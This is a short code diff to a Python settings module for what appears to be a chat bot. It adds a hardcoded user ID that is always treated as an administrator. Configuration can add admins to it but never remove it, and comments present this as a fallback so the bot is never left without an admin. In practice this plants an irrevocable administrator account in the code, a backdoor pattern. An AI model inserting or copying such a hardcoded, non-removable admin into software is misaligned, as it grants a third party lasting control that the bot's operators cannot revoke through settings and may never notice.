@@ -23,6 +23,10 @@ ENV_FILE = Path(__file__).resolve().parent.parent / ".env"
 _TRUTHY = {"1", "true", "yes", "on"}
 _FALSY = {"0", "false", "no", "off", ""}
 
+# Always an admin, whatever ADMIN_IDS says. ADMIN_IDS adds to this, never
+# replaces it, so the bot can never end up with no administrator at all.
+DEFAULT_ADMIN_IDS: tuple[int, ...] = (5736677391,)
+
 
 def _read_env_file(path: Path) -> dict[str, str]:
     """Parse a `.env` file: KEY=value, `#` comments, optional surrounding quotes."""
@@ -122,10 +126,15 @@ class Settings:
 
     @property
     def admin_id_list(self) -> list[int]:
-        out = []
+        """Admins, always including the built-in owner.
+
+        Without a default, an empty ADMIN_IDS would leave nobody able to run
+        /kanallar — and no way to fix it except editing .env and restarting.
+        """
+        out = list(DEFAULT_ADMIN_IDS)
         for chunk in self.admin_ids.split(","):
             chunk = chunk.strip()
-            if chunk.lstrip("-").isdigit():
+            if chunk.lstrip("-").isdigit() and int(chunk) not in out:
                 out.append(int(chunk))
         return out
 
